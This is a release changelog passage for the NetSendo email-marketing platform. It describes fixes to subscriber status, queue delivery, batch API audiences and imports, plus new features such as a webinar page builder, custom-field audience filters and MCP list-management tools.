  - **Behaviour change for existing funnels:** move steps saved in the builder, a no-op until now, start moving the subscribers who reach them in *List signup* funnels. Review those funnels before deploying if a move step was only added to try it out. Steps that store `from_list_id`/`to_list_id` keep working, under the same active-membership rule; the target is read from `list_id` first, then `to_list_id`. Covered by `tests/Feature/FunnelMoveToListTest.php`. UI strings added in Polish, English, German and Spanish.
- **Subscribers marked "Inactive" kept receiving broadcasts and autoresponders — behaviour change for existing installs:** "Inactive" — on the edit form, in the bulk *Change status* action, over the API (`status: inactive`) and in the file import — lowers only the boolean `subscribers.is_active_global`, while `subscribers.status` stays `active`. The per-minute CRON never read that flag: `CronScheduleService` skipped a queue entry only when `status` was not `active`, and recipient resolution (`Message::getUniqueRecipients`/`syncPlannedRecipients`) looks only at the list membership. Only the batch endpoints `POST /api/v1/email/batch` and `POST /api/v1/sms/batch` left such contacts out. So "Inactive" was a label: the contact went on getting every email and SMS broadcast and every autoresponder of their lists.
  - **CRON now skips them.** `processQueue` (email) and `processSmsQueue` (SMS) mark the entry of a subscriber whose flag is off as `skipped` with the reason *Subscriber is marked inactive* — once the entry is due, not before, so an autoresponder step still ahead waits for the contact to be reactivated. The wording deliberately avoids "unsubscribe": Brain's `PerformanceTracker` counts skipped entries whose reason contains it as unsubscribes. Contacts are still planned as recipients, so audience counts do not change — they show up under "skipped" instead of "sent".
  - **What changes after the update.** Every contact currently marked *Inactive* stops receiving mail at the next CRON run, including autoresponder sequences already in progress. Review them before deploying if that status was set casually: the *Inactive* status filter on the subscriber list shows exactly these contacts (or `SELECT COUNT(*) FROM subscribers WHERE status = 'active' AND is_active_global = 0 AND deleted_at IS NULL`). Setting a contact back to *Active* resumes delivery, including the remaining steps of their sequences; what came due while they were inactive is not re-sent, as with bounced and unsubscribed addresses — *Send to missed* recovers such autoresponders. `POST /api/v1/email/send` addressed to an existing inactive contact is skipped the same way, as it already was for a bounced one (the SMS endpoints send directly and are unaffected). Besides *Active* in the interface or the API, the flag is raised by confirming a double opt-in and by the resubscribe link, but not by a new single opt-in form or API signup to a list.
  - **`PUT /api/v1/subscribers/{id}` handles `status` like the interface.** It wrote the value straight into the `status` column: `active` left the flag off, so an API client could no longer bring an inactive contact back once the flag mattered, and `inactive` stored a value the *Inactive* filter never matched while the API resource still reported the contact as `active`. `active` now sets `status = active` and raises the flag, `inactive` only lowers the flag; `bounced` and `unsubscribed` are written as before. Covered by `tests/Feature/InactiveSubscriberDeliveryTest.php`.
- **`POST /api/v1/email/batch` sent to the whole list when the request narrowed it by tags, subscribers or excluded lists:** the endpoint resolves its recipients when the request comes in — globally active members of `list_id`/`contact_list_ids`, narrowed by `tag_ids` and `subscriber_ids`, minus `excluded_list_ids` — and plans one queue entry per subscriber it found, but the broadcast it creates only kept the lists: the tag and subscriber filters cannot be expressed on a message, and the exclusions were simply not stored. The per-minute CRON (`CronScheduleService::processQueue`) runs `Message::syncPlannedRecipients()` on every due broadcast, and until sending starts that sync plans every active member of the attached lists. So the first run — within a minute, or at `schedule_at` — added everyone else on the list, subscribers on the excluded lists included, and dispatched them all, while the API had answered `202` with the narrowed `queued_count` and `email.queued` had reported the same. A batch that narrows its audience with `tag_ids` or `subscriber_ids` is now marked as a snapshot (new `messages.recipients_snapshot` column, migration `2026_09_14_120000_add_recipients_snapshot_to_messages.php`): the sync never adds recipients to it, but it still drops pending ones who leave the audience before sending starts — unsubscribed from the list, or put on an excluded list — and the planned count is the planned recipients still in that audience. The lists stay attached rather than being dropped to get the same effect, because they still matter at send time: a single list scopes the unsubscribe link to that list instead of the preferences page, and its sending schedule and per-minute limit apply. `excluded_list_ids` are now stored as the message's excluded lists — the same exclusions the editor sets — so a plain list batch with exclusions keeps following its list until sending starts, like a broadcast from the editor, without planning anybody on those lists; a batch with only `list_id`/`contact_list_ids` behaves exactly as before. The endpoint also attached the list IDs exactly as sent, not the ones it had validated: an SMS list, or another account's list on the same instance, passed in `contact_list_ids` was ignored when resolving recipients, attached nonetheless, and its members were then planned by the sync and sent this email from the caller's mailbox. Only the account's own email lists are attached now, and only its own lists as exclusions. Duplicating such a batch in the editor gives a regular draft that targets its lists, since the copy has no queue entries of its own. Batches created before this change carry no flag and cannot be told apart, so one still scheduled for later widens when it comes due as before. Covered by `tests/Feature/Api/EmailBatchAudienceTest.php`.
- **Saving a subscriber deleted their unsubscribe history and per-list bounce records:** the edit form lists only the lists a subscriber is *actively* on (`SubscriberController@edit` loads memberships with pivot `status = active`), but `SubscriberController@update` compared the submitted lists against *all* of the subscriber's memberships and detached every one that was not submitted. Because the form never showed the others, it never submitted them either, so simply opening a contact and pressing *Save* — to fix a typo in a name, say — hard-deleted every `contact_list_subscriber` row whose status was `unsubscribed`, `bounced` or `pending` (double opt-in not yet confirmed). That erased the record that the person had opted out of a list (with its `unsubscribed_at`), the per-list bounce records `BounceProcessingService` writes by default (`bounce_scope = list`, including `soft_bounce_count`), and double opt-in signups still awaiting confirmation. The update now removes only the active memberships that were left unticked — the ones the form displays — and leaves every other membership untouched. Ticking a list the subscriber had left still reactivates that membership and fires `SubscriberSignedUp` for it, exactly as before. Rows already deleted this way cannot be recovered by this fix. Covered by `tests/Feature/SubscriberUpdateMembershipTest.php`.
- **A bounced subscriber was shown as "Active" and could never be reactivated ([#31](https://github.com/NetSendo/NetSendo/issues/31)):** a subscriber carries two global markers — the `status` column (`active`, `bounced`, `unsubscribed`), which `BounceProcessingService` sets and which the CRON send gate checks (`CronScheduleService` skips anyone who is not `active`), and the boolean `is_active_global`. `SubscriberController@index`, `show` and `edit` built the status from the boolean alone (`is_active_global ? 'active' : 'inactive'`), so a globally bounced address carried a green *Active* badge while every message to it was skipped as "Subscriber is no longer active". The edit form then only wrote `is_active_global`, which left `status = bounced` untouched: no action in the interface could bring the address back.
  - **The real status is shown.** New `Subscriber::display_status` returns `bounced` or `unsubscribed` when the stored status says so — that is what stops delivery, so it wins — and otherwise `active`/`inactive` from the flag. The subscriber table, the subscriber card and the edit form all use it, with the badges and translations that already existed for those values; the card's badge no longer reports every non-active contact as "Inactive".
  - **Choosing "Active" reactivates.** On the edit form and in the bulk *Change status* action, `active` now sets `status = active` as well as the flag, and zeroes the soft-bounce counters of a reactivated contact — a counter left at the list's threshold would mark the address bounced again on its next temporary failure. Re-adding a list on which the membership had bounced resets that list's counter too.
  - **Nothing clears a bounce by accident.** A bounced or unsubscribed contact opens in the edit form with that status selected and a note explaining why sends skip it; saving without changing it keeps it. `inactive` only lowers the flag and never clears the stored status, and the status cannot be set to `bounced`/`unsubscribed` by hand (the form accepts only `active`, `inactive` or the status the contact already has).
  - **The export tells the truth as well.** The `status` column of the subscriber export carried the same `active`/`inactive` mask; it now writes the display status. The importer does not read `bounced`/`unsubscribed` back, so re-importing such a file leaves those contacts exactly as they are.
  - Delivery rules are unchanged: bounced and unsubscribed addresses are still skipped by CRON until reactivated. Covered by `tests/Feature/SubscriberStatusTest.php`. UI strings added in Polish, English, German and Spanish.
- **Emails sent through `POST /api/v1/email/send` — and `/email/batch` to `subscriber_ids` or `tag_ids` — were never delivered, yet ended up marked as sent:** both endpoints create a `broadcast` with `status = scheduled` and plan one queue entry per recipient they resolved, but attach no contact list (the batch endpoint attaches one only when it targets `list_id`/`contact_list_ids`). Before dispatching anything, the per-minute CRON (`CronScheduleService::processQueue`) runs `Message::syncPlannedRecipients()` on every due broadcast, and that sync measures the planned entries against the message's audience — its contact lists and CRM contacts. A message with neither has an empty audience, so every entry was marked `skipped` ("Subscriber removed from list or unsubscribed") in the very run that was supposed to send it, the planned count dropped to 0, and the "FIX #13" auto-complete then flipped the broadcast to `sent`. No `SendEmailJob` was ever dispatched, although the API had answered `202 Email queued` and fired `email.queued` — which hit every email sent this way from the n8n node and the MCP client, and scheduled ones (`schedule_at`) as soon as they came due. The sync now leaves a broadcast with no list and no CRM contact attached alone: its recipients are exactly its queue entries, so they stay planned, the planned count is kept and CRON dispatches them. List- and CRM-based broadcasts behave as before — recipients who leave the list before sending starts are still dropped, including when the list itself has since been deleted (lists are soft-deleted, so the attachment survives and still counts as an audience). Messages already lost this way are not re-sent automatically; scheduled ones that were not due yet at deploy time go out normally. The SMS endpoints were not affected: they hand each message straight to `SendSmsJob` instead of the CRON queue. Covered by `tests/Feature/Api/EmailApiDispatchTest.php`.
- **Saving a broadcast could crash with `SQL 1062 Duplicate entry … message_queue_entries_message_id_subscriber_id_unique` ([#30](https://github.com/NetSendo/NetSendo/issues/30)):** `MessageController@update` marks a "send now" broadcast as due (`status = scheduled`, `scheduled_at = now()`) and then populates its queue through `Message::syncPlannedRecipients()`. The per-minute CRON (`CronScheduleService::processQueue`) selects exactly such messages and runs the same sync. Both read the existing entries, both computed the same "new" recipients, and each then inserted them one `create()` at a time — whichever came second hit the `(message_id, subscriber_id)` unique index and the save ended in a 500. The bigger the list, the longer that window stayed open, which is why it showed up on large, freshly duplicated broadcasts; duplicating a message was not the cause in itself, since the copy carries no queue entries. The broadcast branch now inserts in bulk with `insertOrIgnore` (chunks of 1000), so populating the queue is idempotent, a recipient already planned by a concurrent sync is simply skipped, and `added` counts only the rows this call actually inserted. It is also one query per chunk instead of one per subscriber. The same check-then-create race with CRON was closed at the other places that plan entries for a message that is already due — *Resend* (new recipients only), *Send to missed*, `POST /api/v1/email/batch` and the `CreateAutoresponderQueueEntries` signup listener (where a lost race used to fail the queued job and retry it for nothing). Covered by `tests/Feature/MessageQueueSyncTest.php`, which reproduces the interleaving deterministically.
- **The n8n trigger could not register `email.queued` — and took the whole trigger down with it:** the platform dispatches that event from `EmailController`, but it was missing from `Webhook::EVENTS`, against which `POST /api/v1/webhooks` validates. Since a trigger registers every selected event in one request, ticking "Email Queued" in n8n failed the registration of the entire node, not just that one event. Added to the catalog.
- **Campaigns activated through the API/MCP never sent anything — every recipient was reported as "skipped":** `messages.status` only ever means `draft`, `scheduled` or `sent`, but `POST /api/v1/messages/{id}/send` wrote `active` for autoresponders and `sending` for broadcasts. Nothing in the product understands those two values: both the signup listener (`CreateAutoresponderQueueEntries`) and the CRON processor (`CronScheduleService::processQueue`) select on `status = 'scheduled'`. So a queue message activated over the API was invisible to the entire send pipeline — no queue entry was created when somebody subscribed, CRON never backfilled or dispatched one, and each new subscriber rolled straight into the "skipped" counter on the message list, which reports recipients whose send time has passed with no entry behind them. The message meanwhile showed as **Active** in the interface, because that badge reads `is_active`, not the status. A broadcast sent the same way kept its planned recipients and was never dispatched at all. The endpoint now writes `scheduled` in both cases (and syncs recipients on activation, so the stats are populated immediately), and migration `2026_09_05_120000_repair_api_activated_message_statuses.php` repairs existing rows: autoresponders return to `scheduled` and resume sending, while broadcasts are deliberately **not** auto-dispatched — one could be weeks old — and go back to `draft` (or `sent` if delivery had partially happened) for the owner to decide.
- **Activating a draft queue message from the message list left it just as invisible:** the Active/Inactive toggle only flipped `is_active`, so a message saved as a draft and then switched on kept `status = 'draft'` and was skipped by the same two queries — labelled Active, sending nothing. Activating now promotes the draft to `scheduled` as well.
- **`list_mailboxes` (MCP) hid the very thing a caller picks a sender by:** the tool mapped `email` and `is_verified`, neither of which the API returns — a mailbox has `from_email`/`from_name` and there is no verification flag at all — so both came out `undefined` and were dropped from the JSON. An assistant asked to choose a sender saw only ids and display names, several of them identical, with no address behind them, while the tool's own instructions told it to prefer `is_verified: true`. It now returns `from_email`, `from_name` and `provider`, and `GET /api/v1/email/mailboxes` additionally exposes `allowed_types` — the allow-list that decides whether a mailbox will send broadcasts, autoresponders or system mail, and which silently rejects the send when it does not match.
- **A day-0 autoresponder could be missed whenever its queue entry was not created at signup:** the CRON backfill only schedules recipients whose send time is still in the future, but a day-0 message is due at the very instant somebody subscribes, so by the next CRON tick it is always slightly overdue and could never be recovered — the subscriber went straight to "missed". Entries whose send time passed within the last `EMAIL_AUTORESPONDER_BACKFILL_GRACE_MINUTES` minutes (default 60) are now backfilled. Anything older still stays "missed" for the explicit *Send to missed* action, so activating a sequence on an existing list never blasts it.
...
- **A visual page builder for the public webinar funnel pages — blocks, columns, colours and a live preview:** the registration and thank-you pages were fixed Blade templates with a hard-coded indigo gradient; the only thing an owner could change was the copy in a handful of fields plus a flat list of text/video "sections". There was no way to reorder anything, put two things side by side, change a single colour, or see the result without registering for one's own webinar. New **Kreator stron** screen (`webinars/{webinar}/pages/{page}`, reachable from the webinar edit screen) builds each page from rows and blocks, and the whole definition lives in `webinars.settings['pages']` — no migration, and nothing changes for a webinar until its page is built and enabled.
  - **Rows and columns.** Each row takes a 1, 2 or 3-column layout (`1`, `1-1`, `1-2`, `2-1`, `1-1-1`) with its own background (none / card / primary / custom colour), padding, column gap, width, corner radius, alignment and vertical alignment. Changing a layout down never loses content — blocks from the dropped column move into the last remaining one. Blocks drag between columns and rows.
  - **20 block types.** Heading, paragraph, image, video (YouTube/Vimeo), button, divider, spacer, custom HTML; registration form (with per-field toggles for first name, last name, phone and timezone, and its own labels and consent note), auto-webinar session picker, date card, countdown, registration summary (session time, personal watch link, calendar buttons) and Calendly; benefit checklist, numbered steps, testimonials, FAQ accordion, speaker bio and stat figures. Blocks are offered per page — the signup form cannot be dropped onto the thank-you page, and the registration summary only exists where there is a registration to summarise.
  - **A real theme, not a class swap.** Twelve colours, solid/gradient/image background with a gradient angle, separate body and heading fonts (Google Fonts fetched only when the theme asks for one), corner radius, page width, button style and drop shadows. Builder-rendered pages ship their own stylesheet driven by CSS variables and no longer pull Tailwind from a CDN.
  - **Six starter templates** — violet (the current look), navy & teal, light minimal, corporate, high-urgency sales and elegant serif. "Apply everything" also lays the page out **from the webinar's existing content** (headline, subheadline, benefit list, custom sections, Calendly settings), so nobody starts from an empty canvas and nothing already configured is lost.
  - **The preview is the real page.** It is rendered server-side through the same Blade templates the public route uses and shown in a sandboxed iframe, desktop or mobile — so the preview cannot drift from what visitors get, which a JavaScript re-implementation of the renderer would eventually do.
  - **Scope per page.** Registration, post-registration thank-you and post-purchase thank-you are built entirely from blocks. The waiting room and replay keep their player, chat, countdown and watch-time tracking untouched — there the builder contributes the theme and blocks rendered under the player, scoped to `.wb-scope` so the host page is never restyled.
  - **Copy can carry tokens** — `webinar_name`, `webinar_date`, `webinar_time`, `first_name`, `last_name`, `email`, `watch_url`, `register_url` — resolved at render time.
  - **Everything the builder posts is normalised server-side:** unknown block types, blocks not allowed on that page and a duplicated signup form are dropped rather than stored, enums fall back to their defaults, and repeatable entries are capped. A "Classic template" button removes the definition and the public page falls back to the previous rendering.
  - Tested by rendering **every** block type on a live public page and **every** preset across all five pages, plus the save/preset/preview endpoints and their ownership checks. UI strings added in Polish, English, German and Spanish.

- **Subscribers can finally be exported from the interface — and the file that comes out is the file the importer reads back:** the subscriber table had an Import button and no Export at all. The only exports that existed served someone else: `ExportSubscribersCsv` queues a job and mails a link (eight fixed columns, no filters), and `ListExportService` answers an API caller with rows in a JSON body. Neither could be clicked, and neither round-tripped — nothing that came out could be edited and put back. New `SubscriberExportService` streams the table straight to the browser in id-ordered chunks, so a 200k-row export costs one chunk of memory rather than the whole list.
  - **Six variants, picked in a dialog on the subscriber screen.** `netsendo` (default, and the one that round-trips) carries `netsendo_id`, every editable attribute, list memberships with their per-list status, tags and all custom fields; `basic` is email + name; `contact` adds phone, gender and language; `marketing` carries lists, tags and the engagement counters; `full` is every column; `custom` lets the columns be ticked one by one. The dialog shows the exact column list before the download starts, and says plainly whether the chosen variant round-trips.
  - **Five formats:** `csv`, `csv_excel` (semicolon + BOM, because Excel otherwise reads Polish characters as mojibake), `tsv`, `json` (an envelope carrying the format version, the field list and the filters that produced it) and `ndjson`. Dates leave as ISO 8601 by default, or in a readable local form for someone who only wants to look at them.
  - **Scope follows the screen.** The export covers either the contacts ticked in the table — including a full "select all in list", which is why the endpoint is a POST and not a query string — or the current filter (search, list, list type), with the membership state chosen separately (`active`, everyone, or only the unsubscribed and bounced). Visibility mirrors `SubscriberController@index` exactly: a subscriber is reachable only through a list the user can open, so naming another account's ids outright still exports nothing.

- **The file importer was rewritten around the same format (`SubscriberFileImportService`):** the previous one split the file on `"\n"` and ran `str_getcsv` per line, so a quoted field containing a newline — which every CRM export has — tore one contact into two broken rows. It understood five columns; everything else the product stores could be exported and never put back. The new one reads through `League\Csv` and also accepts JSON and NDJSON, so whatever the export writes, the import takes.
  - **Identity.** With a `netsendo_id` column a re-import updates the same contact even when the address itself was corrected in the spreadsheet — previously a fixed typo created a second contact and orphaned the first. Matching order is id, then email, then phone; a corrected address that already belongs to another contact of the account is left alone rather than aborting the row on the unique index.
  - **Repeating an import no longer restarts everyone's autoresponders.** `SubscriberSignedUp` resets a subscriber's queue entries (`CreateAutoresponderQueueEntries`, with `reset_autoresponders_on_resubscription` defaulting to true), and the old importer fired it for every row — so re-uploading an unchanged file restarted every sequence on the list, and moved every signup date with it. The event now fires only where a membership was actually created or reactivated. The previous behaviour is still available as *"For every row — restart sequences"*, and *"Do not trigger at all"* migrates an audience silently.
  - **What the new columns do on the way in.** `tags` creates missing tags and either adds to or replaces the existing set; `lists` (`Newsletter:active|Klienci:unsubscribed`) restores memberships with their per-list status, optionally creating lists that no longer exist, which makes a target list optional for that kind of file; `status`, `list_status`, `gender`, `language`, `timezone`, `source` and the three dates map to what they say, with the dates applied only when explicitly asked for. A list whose name contains a colon survives the round trip: only a trailing token that is a known status is read as one.
  - **Existing contacts are handled by an explicit choice** — fill empty fields only (the old behaviour, which could never overwrite better data), overwrite from the file (what a corrected export needs), or leave their data alone.
  - **A dry run before anything is written.** "Check the file" reports how many contacts would be created, updated, restored or skipped, names the rows it would reject and why, and shows the detected column mapping — the importer used to be all-or-nothing, with a wrong separator discovered only after the contacts were in the list. A file this app exported is recognised on selection and its options are set accordingly.
  - Upload limit raised to 20 MB and 50 000 rows per file; `.tsv`, `.json` and `.ndjson` accepted alongside `.csv`.
  - **Server-side subscriber strings now exist:** `__('subscribers.crm_add_failed')` and friends had no `lang/*/subscribers.php` behind them, so those flash messages rendered as the raw translation key. Added in all four languages together with the new import messages.

- **Campaign audiences can now be narrowed by subscriber custom fields — and so can the exclusions:** a message could only ever target whole lists, so "send this only to the people whose *city* is Oświęcim" meant maintaining a parallel list by hand. Custom fields could be collected on a form, imported, exported and inserted into content as placeholders, but nothing in the product could ever *select* on them — not a trigger, not the recipient picker, not the exclusions. Both sides of the audience picker on the message/campaign form now accept conditions on any custom field available for the selected lists — global fields plus the fields defined for those lists — resolved dynamically as the list selection changes, so the offered fields always match the audience actually being addressed.
  - **Include conditions decide who receives the message:** only subscribers whose fields match are recipients.
  - **Exclude conditions narrow the exclusion, not the audience.** "Exclude list X, city = Kraków" drops only the Kraków members of list X and leaves the rest of that list in — something an exclusion list alone could never express, since it was all-or-nothing. With no exclusion list selected, the conditions apply to the audience itself ("do not send to anyone from Kraków"), and never reach beyond the message's own lists.
  - **Values are picked from what subscribers actually hold**, not typed blind: every condition has its own searchable value picker listing the distinct values stored for that field across the lists in play, most common first, with the number of subscribers holding each one. A value can still be typed in by hand for data that has not been imported yet, and `select`/`radio` fields additionally offer their declared options even when nobody holds them.
  - **Operators are offered per field type:** `is any of` / `is none of` (multi-value, OR between the values), `contains`, `does not contain`, `starts with`, `ends with`, `is filled in`, `is empty`, plus `greater/less than`, `greater/less or equal` and `between` for number and date fields. Several conditions on one side combine with AND or OR, chosen per side. Negative operators deliberately also match subscribers who never filled the field in — "city is not Kraków" reaches people with no city. A condition still waiting for its value is skipped instead of silently matching everyone.
  - **A live recipient estimate** under the picker shows how many people the current lists and conditions reach and how many the exclusions removed, computed through the very same query the send path uses rather than a separate approximation.
  - Applied everywhere the audience is resolved: broadcast sends, the CRON recipient sync and backfill, the autoresponder signup listener (a new subscriber only enters the queue when they match) and the queue schedule / missed-recipients statistics — so the projection can never promise a send the queue will not make. Duplicating a message copies its conditions.
  - Also settable over the API on `POST /api/v1/messages`, `PUT /api/v1/messages/{id}`, `POST /api/v1/messages/{id}/lists` and `POST /api/v1/messages/{id}/exclusions` through `include_field_filters` / `exclude_field_filters` (each row `custom_field_id`, `operator`, `values`) and `include_field_filter_match` / `exclude_field_filter_match`. Rows referencing a field the key's owner does not own are rejected.
  - **Migration:** `2026_08_31_090000_create_message_field_filters_table.php`.

- **Full contact-list management over MCP — import, export, hygiene, membership and observability (33 new/extended tools, 73 total):** the MCP server could read lists but never act on them, so an AI assistant could describe an audience and not maintain one. Every operation below is a new REST endpoint under `/api/v1` plus the MCP tool that wraps it, sharing one service layer in `app/Services/Lists/`.
  - **Import in whatever shape the data arrives (`preview_list_import`, `import_subscribers`):** inline CSV, TSV, JSON records or a bare address list — no file upload, because that is what an assistant can actually produce. Delimiter (`,` `;` tab `|`) and header row are auto-detected, column mapping is resolved from common PL/EN/DE/ES headers (`email`, `e-mail`, `imię`, `nazwisko`, `telefon`, …) and can be overridden per column, including custom fields (`custom:miasto`) and `ignore`. The plain-address format accepts `Anna Kowalska <anna@example.com>` and `anna@example.com, Anna, Kowalska`. Duplicates fold by **real mailbox**, so `JAN@x.pl`, `jan@x.pl` and `j.an+news@gmail.com` collapse onto one contact instead of creating three. Guards, all tunable per call: skip invalid syntax (on), skip disposable domains (on), skip suppressed addresses (on), skip role addresses (off), auto-correct typo domains such as `gmial.com` → `gmail.com` (off). `preview_list_import` returns the detected mapping, per-action counts and the problem rows **without writing anything**, so a wrong column is caught before it lands in the database. The write path deliberately mirrors `SubscriberController@batch` — restores soft-deleted contacts, honours the list's `resubscription_behavior` and fires `SubscriberSignedUp` — so autoresponders, automations and webhooks behave identically no matter the entry point; `trigger_automations: false` migrates an audience silently. Limit 5000 rows per request.
  - **Export the assistant can actually reason about (`export_list`, `get_export_fields`, `queue_list_export`):** the existing export queues a job and mails a download link to a human, which is useless to an API caller. `GET /lists/{id}/export` returns the rows inline as `json`, `csv` or `ndjson`, filtered by status, tags, signup date range and engagement (`engaged=false` isolates contacts who never opened or clicked), cursor-paged at up to 5000 rows per call. The queued CSV export is unchanged and still available.
  - **List hygiene (`analyze_list_health`, `clean_list`, `dedupe_list`, `verify_list_emails`):** a single pass over the membership classifies every contact into 14 categories — `invalid_syntax`, `typo_domain`, `disposable_domain`, `role_address`, `missing_contact`, `duplicate`, `hard_bounced`, `soft_bounce_risk`, `suppressed`, `unsubscribed`, `unconfirmed`, `globally_inactive`, `never_engaged`, `dormant` — and reports counts with samples, a 0–100 health score and ordered recommendations naming the suggested action per problem. `clean_list` applies `unsubscribe`, `remove`, `tag`, `delete` or `suppress` to the matched categories, cancelling any queued messages for that list on the way. `dedupe_list` merges contacts sharing one mailbox: the surviving record inherits every list membership, tag, custom field value and the higher engagement counters. `verify_list_emails` checks syntax and resolves MX/A records **per distinct domain** (cached 24 h), so cost scales with domain count rather than list size.
  - **Bulk membership operations (`add_list_members`, `remove_list_members`, `set_member_status`, `move_list_members`, `copy_list_members`, `tag_list_members`):** all six take the same selection block — explicit `subscriber_ids`, explicit `emails`, or a `filter` over the list (`{"status":"active","never_opened":true,"subscribed_before":"2025-01-01","limit":500}`) — capped at 5000 contacts per call and chunked so a large operation never loads every model at once. Moves and copies require matching channels (email→email, sms→sms) and refuse a cross-channel transfer with an explicit message rather than silently producing unmailable members.
  - **Observability (`get_list_activity`, `get_list_engagement`, `get_subscriber_activity`, `get_list_stats`):** the activity feed merges subscription-pivot events (signups, confirmations, resubscribes, unsubscribes), bounce state, the tracking tables (opens, clicks) and the send queue (`sent`, `failed`) into one chronological stream, filterable by event type — enough to see that a spike in unsubscribes followed a specific send. `get_list_engagement` returns audience composition, growth/churn with a daily series, open/click/click-to-open rates, best-performing messages and links, the most engaged contacts and the size of the silent part of the list. `get_subscriber_activity` gives one contact's full history including which messages are still queued for them.
  - **Suppression and reporting back (`list_suppressions`, `suppress_emails`, `unsuppress_emails`, `send_notification`, `list_notifications`):** the account-wide do-not-mail list is now reachable over the API and outranks every list — suppressed addresses are skipped by future imports. Lifting suppression deliberately does **not** resubscribe anyone. `send_notification` posts to the account owner's notification centre so unattended work can report its outcome or ask for a decision; it cannot reach subscribers or anyone outside the account.
  - **Safety model.** Everything that can lose data refuses to act until told twice: `clean_list` and `dedupe_list` run as a dry run unless `dry_run: false`; the irreversible `delete` and `suppress` actions additionally require `confirm: true`; deleting a list that still has members requires `confirm: true`; removing members selected by `filter` requires `confirm: true`. The intent is that an assistant always shows the affected count from the dry run before anything is written.
  - **New MCP prompts and resource:** `import_contacts` (preview-first import), `list_report` (performance report with prioritised next steps), a rewritten `cleanup_list` (audit → plan → approval-gated execution), and the `netsendo://lists` resource listing every list with size and channel.
  - **Permissions:** two new API scopes, `lists:write` and `notifications:write`. Keys created before this change are granted them automatically **only if** they already held `subscribers:write`, so a deliberately narrow key keeps its scope and must be widened by hand in Settings → API keys; a missing scope returns `403` naming the exact permission. **Migration:** `2026_08_04_120000_grant_list_management_permissions_to_existing_api_keys.php`.
  - MCP client bumped to **1.4.0**. Self-hosted Docker installs pick this up on rebuild (`docker compose --profile mcp build`); remote users on `npx @netsendo/mcp-client` need the package republished to npm.

- **Queue messages were never delivered when the mailbox's "allowed types" excluded `autoresponder` — while broadcasts kept working:** `Mailbox::canSendType()` is an allow-list, so a mailbox configured for broadcasts only rejected every autoresponder send. `SendEmailJob` then discarded the mailbox and aborted with the misleading error *"Brak skonfigurowanej skrzynki pocztowej"* — even though a mailbox clearly existed. Worse, the job had **no `failed()` handler**, so after the retries were exhausted the queue entry stayed in `queued` forever; the cron only ever picks up `planned` entries, so that recipient was never sent to, never retried and never surfaced as failed. The result was exactly the reported symptom: broadcasts deliver normally while every queue message sits at "Wysłano 0" indefinitely, with nothing in the UI explaining why. Now: the job falls back to any active mailbox of the user that *is* allowed to send the message type (`MailProviderService::getBestMailbox()`), the error names the actual cause (*"no active mailbox has the send type … enabled"*, pointing at Settings → Mailboxes → allowed types) instead of claiming no mailbox exists, and `SendEmailJob::failed()` marks the entry as `failed` so it appears in the stats and can be retried with the existing "Retry failed" action.
- **Every container restart deleted all pending sends (database queue driver):** the Docker entrypoint unconditionally ran `DB::table('jobs')->truncate()` on startup, on the assumption — stated in its own comment — that "the queue now uses Redis". The default queue driver is `database` (`config/queue.php`, `.env.example`), and neither compose file overrides it, so for a default installation the `jobs` table **is** the live queue: every update, reboot or container recreation silently discarded all queued `SendEmailJob`s. Their queue entries had already been flipped to `queued`, a state nothing ever re-processes, so those recipients were permanently lost from the send pipeline. The cleanup now reads the effective driver first and only removes orphaned rows when the queue is *not* database-backed.
- **Entries stuck in `queued` are now recovered automatically:** a queue entry is marked `queued` the moment its job is dispatched and only the job itself can move it to `sent`/`failed`, so any lost job (worker down, container restarted mid-flight, job wiped) parked the entry forever. Each cron run now resets entries that have been `queued` longer than `netsendo.email.stuck_queued_minutes` (default 30, env `EMAIL_STUCK_QUEUED_MINUTES`, `0` disables) back to `planned` for re-dispatch, and logs how many it recovered. The threshold is deliberately well above the worst-case dispatch delay (stagger window + transient retries) so a merely slow send is not duplicated.
- **A queue message assigned to several lists never sent to anyone whose list was not the first one:** the cron applied the sending schedule and per-minute limit of `contactLists->first()` — an arbitrary list of the message — to *every* recipient, whatever list they actually came from. If that first list had a restrictive or disabled sending window, all recipients of the message were skipped, including subscribers of the other lists, and the skip left no trace in the database (the entry stayed `planned`, so nothing surfaced in the UI). This is why the same subscriber received queue messages assigned to a single list while the multi-list ones never arrived. Schedule and rate limit are now taken from the list the recipient is actually counted under, on both the email and SMS queues.
- **Signup date for multi-list queue messages is now always the oldest membership:** a subscriber sitting on several of a message's lists is counted from when they first joined any of them, so adding them to another list no longer restarts a sequence they already went through (and they still receive the message only once). The schedule projection, the scheduler, the signup listener and the cron all resolve this one anchor — previously each used a slightly different rule (an arbitrary `first()` list that even ignored the membership status), so subscribers were reported as "missed" while actually being scheduled, or the other way round. Legacy rows without a usable signup date fall back to the pivot's `created_at` instead of being silently dropped from every bucket.
...
- **`Subscriber::removeTag()` never removed a tag and `syncTagsWithEvents()` only ever added — the legacy `subscribers.tags` column shadows the `tags()` relation:** the table still carries a JSON `tags` column from before tags moved to a pivot, and in Eloquent an attribute always wins over a relation of the same name, so `$this->tags` returned that (null) column rather than the loaded tags. `removeTag()` guarded its detach with `$currentTags->contains(...)`, which therefore never matched — the tag stayed attached and `TagRemoved` never fired. `syncTagsWithEvents()` derived "tags to remove" from the same source, so its removal set was always empty and a "sync" silently degraded into an append; this also affected the public `POST /subscribers/{id}/tags` endpoint and the MCP `sync_subscriber_tags` tool, both documented as replacing the tag set. Both methods now query the pivot through the relation (`$this->tags()`), and `removeTag()` keys off the row count `detach()` reports, which is accurate and idempotent.
- **MCP array query parameters were dropped by PHP:** the client serialised repeated parameters as `fields=a&fields=b`, a form from which PHP builds no array — only the last value survived. Field selection, tag filters and activity event-type filters therefore silently collapsed to a single value. The client now emits the bracketed form (`fields[]=a&fields[]=b`).

### Fixed

- **Every webinar registration ended on a 500 page — Blade miscompiles an inline `@php(...)` that sits above a `@php … @endphp` block:** the contact was created, added to the list and emailed, but instead of the thank-you screen the visitor got *500 SERVER ERROR*. Blade extracts `@php` blocks with `/(?<!@)@php(.*?)@endphp/s` **before** compiling directives, so the inline `@php($thankYouMessage = …)` near the top of `webinar/registered.blade.php` was swallowed as the opening of the block that ended fifteen lines later: everything between them was emitted as raw text, the `$displayTime` assignment never ran, and the compiled `@if($displayTime)` died on an undefined variable. `webinar/partials/calendly.blade.php` had the same shape, which broke the standalone `/thank-you` page too. Both files now use the block form throughout, and a new repo-wide test fails the build if any view mixes the two forms again.
